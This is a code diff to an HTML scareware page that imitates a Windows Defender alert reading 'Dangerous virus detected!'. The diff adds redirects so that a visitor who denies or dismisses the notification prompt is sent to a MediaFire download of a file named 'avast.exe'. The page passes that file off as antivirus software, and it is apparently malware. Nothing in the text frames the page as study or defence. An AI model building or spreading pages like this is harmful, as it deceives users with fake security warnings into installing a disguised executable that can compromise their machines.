@@ -61,13 +61,16 @@
                     Notification.requestPermission().then(function(result) {
                         if (result === 'granted') {
                             // User has granted permission
-                            alert("Thank you for granting permission for notifications!");
+                            // Add your notification creation code here if needed
+                            document.getElementById("popupMessage").innerText = "Thank you for granting permission for notifications!";
                         } else if (result === 'denied') {
                             // User has denied permission
-                            alert("You denied permission for notifications.");
+                            // Redirect user to a specific link
+                            window.location.href = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
                         } else {
                             // User has dismissed the permission prompt without making a choice
-                            alert("You dismissed the permission prompt without making a choice.");
+                            // Redirect user to a specific link
+                            window.location.href = 'https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file';
                         }
                     });
                 }
@@ -79,7 +82,7 @@
     </script>
 </head>
 <body>
-    <div class="popup-container">
+    <div class="popup-container" id="popupMessage">
         <div class="icon">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/50/Windows_Defender_logo.svg/1950px-Windows_Defender_logo.svg.png" alt="MALWARE DETECTED">
             <h1>Dangerous virus detected!</h1>
